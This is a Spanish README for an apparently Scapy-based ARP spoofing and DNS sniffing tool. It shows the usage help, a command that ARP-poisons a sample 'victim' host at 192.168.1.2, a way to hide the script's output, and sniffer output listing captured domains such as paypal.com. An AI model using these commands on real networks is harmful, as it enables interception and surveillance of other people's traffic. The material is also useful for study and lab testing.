# ARP Spoof 
Intercepta paquetes en la red local & Sniffer DNS.

### Modo de uso:

## Arp Spoof

`./arp_spoof.py -h`

  usage: arp_spoof.py [-h] -t IP_ADDRESS

  ARP Spoofer using Scapy

  options:

    -h, --help
            show this help message and exit

    -t IP_ADDRESS, --target IP_ADDRESS
            Specify a particular Host/IP to ARP poison.

Victima Ejemplo: 192.168.1.2

`sudo ./arp_spoof.py -t 192.168.1.2`

.
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.
    .
    Sent 1 packets.

[!] Nota: Si no desea ver el output del Script ejecutarlo de la siguiente manera.

`sudo ./arp_spoof.py -t 192.168.1.2 &>/dev/null`

## DNS Sniffer

`sudo ./dns_sniffer`

    [+] Dominio www.paypal.com.
    [+] Dominio m.facebook.com.
    [+] Dominio dev-example.domain-internacional.net.


### Instalación:

**Linux**

`python3  pip install -r requeriments.txt`

